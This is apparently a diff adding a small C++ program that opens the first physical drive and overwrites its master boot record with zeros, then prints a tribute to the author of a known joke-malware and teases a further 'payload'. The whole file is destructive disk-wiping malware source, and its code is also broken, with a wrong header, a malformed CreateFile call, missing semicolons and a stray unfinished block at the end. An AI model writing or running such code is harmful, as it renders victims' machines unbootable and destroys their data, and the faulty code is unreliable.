@@ -1,0 +1,34 @@
+#include <Window.h>
+#include <iostream>
+#include <fstream>
+
+using namespace std;
+
+#define MBR_SIZE 512
+int main()
+{
+    DWORD write;
+    char mbrData[512];
+    
+    ZeroMemory(&mbrData, (sizeof mbrData));
+    
+    HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0"
+         ,GENERIC_ALL,FILE_SHARE_READ|FILE_SHARE_WRITE
+         ,NULL,OPEN_EXISTING,0,NULL,NULL) 
+         if(WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE){
+            cout << "Thanks Leurak for your awesome malware, Danke Leurak für deine tolle Malware. Please wait for the last payload which is a very special one. Bitte warten Sie auf die letzte Nutzlast, die ein ganz besonderer ist" << endl;
+            Sleep(5000)
+            ExitProcess(0)
+         }
+         else{  
+            cout << "Please try again";
+            Sleep(5000);
+         }     
+     CloseHandle(MasterBootRecord);
+     
+     return EXIT_SUCCESS; 
+     
+}
+{
+   fstream file;
+   file.open
